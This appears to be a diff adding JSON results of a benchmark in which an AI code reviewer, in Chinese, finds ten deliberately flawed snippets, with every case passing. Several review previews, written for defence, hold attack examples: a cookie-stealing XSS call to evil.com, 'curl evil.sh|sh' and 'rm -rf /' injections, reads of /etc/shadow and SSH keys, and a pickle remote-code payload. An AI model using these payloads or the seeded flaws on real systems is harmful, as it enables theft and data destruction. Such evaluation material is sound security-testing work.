@@ -1,0 +1,248 @@
+{
+  "generated_at": "2026-10-21T09:01:14.214459+00:00",
+  "base_url": "http://127.0.0.1:8000",
+  "model": "deepseek-chat",
+  "summary": {
+    "total": 10,
+    "passed": 10,
+    "detection_rate": 1.0,
+    "avg_latency_ms": 6440.6,
+    "total_tokens": 13061
+  },
+  "results": [
+    {
+      "id": "sql-injection",
+      "title": "SQL 注入",
+      "passed": true,
+      "matched": [
+        "SQL 注入",
+        "注入",
+        "参数化"
+      ],
+      "latency_ms": 6445,
+      "status_code": 200,
+      "usage": {
+        "prompt_tokens": 80,
+        "completion_tokens": 1286,
+        "total_tokens": 1366,
+        "prompt_tokens_details": {
+          "cached_tokens": 0
+        },
+        "prompt_cache_hit_tokens": 0,
+        "prompt_cache_miss_tokens": 80
+      },
+      "review_preview": "# 代码审查报告\n\n## 审查对象\n\n```python\ndef get_user(username):\n    query = \"SELECT * FROM users WHERE name = '\" + username + \"'\"\n    return db.execute(query)\n```\n\n---\n\n## 🔴 严重问题：SQL 注入漏洞（安全）\n\n### 问题描述\n\n代码使用**字符串拼接**构造 SQL 语句，将外部传入的 `username` 直接拼入查询。这是典型的 **SQL 注入（SQL Injection）** 漏洞。\n\n### 攻击示例\n\n若攻击者传入：\n\n```python\nusername = \"' OR '1'='1\"\n```\n\n最终查询变为：\n\n```sql\nSELECT * FROM users WHERE name = '' OR '1'='1'\n`"
+    },
+    {
+      "id": "xss",
+      "title": "XSS",
+      "passed": true,
+      "matched": [
+        "XSS",
+        "跨站脚本",
+        "textContent"
+      ],
+      "latency_ms": 5543,
+      "status_code": 200,
+      "usage": {
+        "prompt_tokens": 71,
+        "completion_tokens": 1079,
+        "total_tokens": 1150,
+        "prompt_tokens_details": {
+          "cached_tokens": 0
+        },
+        "prompt_cache_hit_tokens": 0,
+        "prompt_cache_miss_tokens": 71
+      },
+      "review_preview": "# 代码审查报告\n\n## 被审查代码\n\n```javascript\nfunction renderComment(comment) {\n  document.getElementById(\"comment\").innerHTML = comment;\n}\n```\n\n---\n\n## 🔴 安全问题（高危）\n\n### 1. XSS（跨站脚本攻击）漏洞\n\n**问题描述**：使用 `innerHTML` 直接插入未经处理的用户输入，是典型的 **DOM-based XSS** 漏洞。\n\n**攻击示例**：\n```javascript\nrenderComment('<img src=x onerror=\"fetch(\\'https://evil.com/steal?c=\\'+document.cookie)\">');\n// 或\nrenderComment('<script>/* 恶意代码 */</sc"
+    },
+    {
+      "id": "hardcoded-secret",
+      "title": "硬编码密钥",
+      "passed": true,
+      "matched": [
+        "硬编码",
+        "密钥",
+        "secret",
+        "环境变量"
+      ],
+      "latency_ms": 5954,
+      "status_code": 200,
+      "usage": {
+        "prompt_tokens": 93,
+        "completion_tokens": 1091,
+        "total_tokens": 1184,
+        "prompt_tokens_details": {
+          "cached_tokens": 0
+        },
+        "prompt_cache_hit_tokens": 0,
+        "prompt_cache_miss_tokens": 93
+      },
+      "review_preview": "# 代码审查报告\n\n## 1. 安全问题（高优先级）\n\n### 1.1 硬编码 API 密钥（严重）\n```python\nAPI_KEY = \"sk-live-1234567890abcdef\"\n```\n- **风险**：密钥直接写入源码，一旦代码提交到 Git、被日志打印、或仓库泄露，密钥即暴露。`sk-live-` 前缀通常表示生产环境密钥，泄露后果严重。\n- **建议**：从环境变量或密钥管理服务读取，并加入 `.gitignore` / 密钥扫描：\n```python\nimport os\n\nAPI_KEY = os.environ[\"API_KEY\"]  # 缺失时快速失败\n# 或使用 os.environ.get(\"API_KEY\") 并显式校验\n```\n生产环境可考虑 AWS Secrets Manager、HashiCorp Vault、Azure Key Vault 等。\n"
+    },
+    {
+      "id": "command-injection",
+      "title": "命令注入",
+      "passed": true,
+      "matched": [
+        "命令注入",
+        "shell",
+        "subprocess"
+      ],
+      "latency_ms": 6601,
+      "status_code": 200,
+      "usage": {
+        "prompt_tokens": 73,
+        "completion_tokens": 1359,
+        "total_tokens": 1432,
+        "prompt_tokens_details": {
+          "cached_tokens": 0
+        },
+        "prompt_cache_hit_tokens": 0,
+        "prompt_cache_miss_tokens": 73
+      },
+      "review_preview": "# 代码审查报告\n\n## 审查对象\n\n```python\nimport os\n\n\ndef ping(host):\n    os.system(\"ping -c 1 \" + host)\n```\n\n---\n\n## 一、安全漏洞（严重）\n\n### 1. 命令注入（Command Injection）— 高危\n\n**问题**：`host` 参数被直接拼接进 shell 命令字符串，未做任何校验或转义。`os.system()` 会通过 shell 执行命令，攻击者可利用 shell 元字符注入任意命令。\n\n**攻击示例**：\n\n```python\nping(\"127.0.0.1; rm -rf /\")          # 执行 ping 后再删除文件\nping(\"127.0.0.1 && curl evil.sh|sh\") # 下载并执行恶意脚本\nping(\"$(cat /etc/passwd)"
+    },
+    {
+      "id": "path-traversal",
+      "title": "路径遍历",
+      "passed": true,
+      "matched": [
+        "路径遍历"
+      ],
+      "latency_ms": 6319,
+      "status_code": 200,
+      "usage": {
+        "prompt_tokens": 84,
+        "completion_tokens": 1298,
+        "total_tokens": 1382,
+        "prompt_tokens_details": {
+          "cached_tokens": 0
+        },
+        "prompt_cache_hit_tokens": 0,
+        "prompt_cache_miss_tokens": 84
+      },
+      "review_preview": "# 代码审查报告\n\n## 审查对象\n\n```python\ndef read_file(filename):\n    path = \"/var/www/uploads/\" + filename\n    with open(path, \"rb\") as f:\n        return f.read()\n```\n\n---\n\n## 🔴 严重安全问题\n\n### 1. 路径遍历漏洞（Path Traversal）— 高危\n\n**问题**：`filename` 直接拼接进路径，未做任何校验。攻击者可传入 `../../etc/passwd` 或 `../../../../etc/shadow` 等，读取服务器上任意文件。\n\n```python\nread_file(\"../../etc/passwd\")   # 读取系统文件\nread_file(\"../../../root/.ssh/id_rsa\")"
+    },
+    {
+      "id": "weak-hash",
+      "title": "弱哈希",
+      "passed": true,
+      "matched": [
+        "MD5",
+        "bcrypt",
+        "argon2",
+        "salt",
+        "加盐"
+      ],
+      "latency_ms": 6974,
+      "status_code": 200,
+      "usage": {
+        "prompt_tokens": 76,
+        "completion_tokens": 1375,
+        "total_tokens": 1451,
+        "prompt_tokens_details": {
+          "cached_tokens": 0
+        },
+        "prompt_cache_hit_tokens": 0,
+        "prompt_cache_miss_tokens": 76
+      },
+      "review_preview": "# 代码审查报告\n\n## 审查对象\n\n```python\nimport hashlib\n\n\ndef hash_password(password):\n    return hashlib.md5(password.encode()).hexdigest()\n```\n\n---\n\n## 🔴 严重安全漏洞\n\n### 1. 使用 MD5 作为密码哈希算法（高危）\n\n**问题**：MD5 是快速哈希算法，设计目标是高效计算，而非抵抗暴力破解。攻击者可用 GPU 每秒计算数十亿次 MD5，现代消费级显卡可在数小时内穷举常见密码空间。\n\n**风险**：\n- 彩虹表攻击：MD5 的常见密码哈希值已被大量收录，可直接反查\n- 暴力破解：无计算成本约束，破解速度极快\n- 已知碰撞漏洞：MD5 已被证明存在碰撞攻击\n\n**建议**：使用专为密码设计的慢哈希算法，如 `bcrypt`、`scrypt`、`argo"
+    },
+    {
+      "id": "n-plus-one",
+      "title": "N+1 查询",
+      "passed": true,
+      "matched": [
+        "N+1",
+        "select_related",
+        "prefetch_related"
+      ],
+      "latency_ms": 6773,
+      "status_code": 200,
+      "usage": {
+        "prompt_tokens": 103,
+        "completion_tokens": 1332,
+        "total_tokens": 1435,
+        "prompt_tokens_details": {
+          "cached_tokens": 0
+        },
+        "prompt_cache_hit_tokens": 0,
+        "prompt_cache_miss_tokens": 103
+      },
+      "review_preview": "# 代码审查报告\n\n## 审查对象\n\n```python\ndef get_users_with_orders():\n    users = User.objects.all()\n    result = []\n    for user in users:\n        result.append({\n            \"user\": user,\n            \"orders\": Order.objects.filter(user=user),\n        })\n    return result\n```\n\n---\n\n## 一、性能问题（严重）\n\n### 1. N+1 查询问题（核心问题）\n\n这是本段代码最严重的问题。假设有 `N` 个用户：\n\n- `User.objects.all()` 执行 **1 次** 查询；\n- 循环内每个用户执行一次 `Order.obje"
+    },
+    {
+      "id": "race-condition",
+      "title": "竞态条件",
+      "passed": true,
+      "matched": [
+        "race",
+        "线程安全",
+        "锁",
+        "Lock",
+        "原子"
+      ],
+      "latency_ms": 6462,
+      "status_code": 200,
+      "usage": {
+        "prompt_tokens": 77,
+        "completion_tokens": 1075,
+        "total_tokens": 1152,
+        "prompt_tokens_details": {
+          "cached_tokens": 0
+        },
+        "prompt_cache_hit_tokens": 0,
+        "prompt_cache_miss_tokens": 77
+      },
+      "review_preview": "# 代码审查报告\n\n## 被审查代码\n\n```python\ncounter = 0\n\n\ndef increment():\n    global counter\n    value = counter\n    counter = value + 1\n```\n\n---\n\n## 一、性能问题\n\n### 1. 使用 `global` 变量带来的性能与可维护性开销\n- **问题**：每次调用 `increment()` 都需要通过全局命名空间查找 `counter`，相比局部变量访问更慢（虽然单次差异微小，但在高频调用场景下会累积）。\n- **建议**：若需要计数，优先使用局部状态封装在类或闭包中，或使用 `itertools.count()` 等内置工具。\n\n```python\nimport itertools\n\n_counter = itertools.count()\n\ndef incremen"
+    },
+    {
+      "id": "insecure-deserialization",
+      "title": "不安全的反序列化",
+      "passed": true,
+      "matched": [
+        "反序列化",
+        "pickle",
+        "任意代码",
+        "不可信"
+      ],
+      "latency_ms": 7077,
+      "status_code": 200,
+      "usage": {
+        "prompt_tokens": 67,
+        "completion_tokens": 1279,
+        "total_tokens": 1346,
+        "prompt_tokens_details": {
+          "cached_tokens": 0
+        },
+        "prompt_cache_hit_tokens": 0,
+        "prompt_cache_miss_tokens": 67
+      },
+      "review_preview": "# 代码审查报告\n\n## 审查对象\n\n```python\nimport pickle\n\n\ndef load_session(data):\n    return pickle.loads(data)\n```\n\n---\n\n## 一、安全漏洞（严重）\n\n### 1. 反序列化不可信数据 —— 远程代码执行（RCE）\n\n`pickle.loads()` 在反序列化时会执行对象中定义的 `__reduce__` / `__setstate__` 等魔术方法，攻击者可以构造恶意 payload 在目标机器上执行任意代码。\n\n**攻击示例：**\n\n```python\nimport pickle, os\n\nclass Exploit:\n    def __reduce__(self):\n        return (os.system, (\"rm -rf /\",))\n\npayload = pickle."
+    },
+    {
+      "id": "resource-leak",
+      "title": "资源泄漏",
+      "passed": true,
+      "matched": [
+        "资源泄漏",
+        "with",
+        "关闭"
+      ],
+      "latency_ms": 6258,
+      "status_code": 200,
+      "usage": {
+        "prompt_tokens": 73,
+        "completion_tokens": 1090,
+        "total_tokens": 1163,
+        "prompt_tokens_details": {
+          "cached_tokens": 0
+        },
+        "prompt_cache_hit_tokens": 0,
+        "prompt_cache_miss_tokens": 73
+      },
+      "review_preview": "# 代码审查报告\n\n## 审查对象\n\n```python\ndef read_config(path):\n    f = open(path)\n    data = f.read()\n    return data\n```\n\n---\n\n## 一、潜在问题\n\n### 1. 资源泄漏（严重）\n\n`open()` 返回的文件对象没有显式关闭。虽然 CPython 在引用计数归零时会自动关闭文件，但：\n\n- 依赖实现细节，**PyPy、Jython 等实现不保证及时回收**；\n- 若 `f.read()` 抛出异常（如磁盘 I/O 错误），文件句柄将泄漏；\n- 在长时间运行的服务中，可能耗尽文件描述符（`Too many open files`）。\n\n**建议**：使用 `with` 语句确保关闭。\n\n```python\ndef read_config(path):\n    with open(pa"
+    }
+  ]
+}
